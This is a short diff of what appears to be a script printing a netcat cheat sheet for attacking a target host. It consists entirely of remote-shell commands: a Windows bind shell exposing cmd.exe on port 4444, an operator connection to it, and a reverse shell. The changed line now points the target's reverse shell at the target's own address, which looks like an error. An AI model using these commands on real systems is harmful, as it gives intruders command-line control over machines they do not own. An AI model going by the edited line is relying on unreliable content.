@@ -15,7 +15,7 @@ TANGO      ==> TASK ==> nc.exe -nlvp 4444 -e cmd.exe
 OPERATOR   ==> TASK ==> nc -nv IP_TANGO 4444
 OPERATOR   ==> TASK ==> nc -lvp 4444
 TANGO      ==> TASK ==> cmd.exe
-TANGO      ==> TASK ==> nc.exe -nv IP_OPERATOR 4444 -e cmd.exe
+TANGO      ==> TASK ==> nc.exe -nv IP_TANGO 4444 -e cmd.exe
 '
 read
 clear
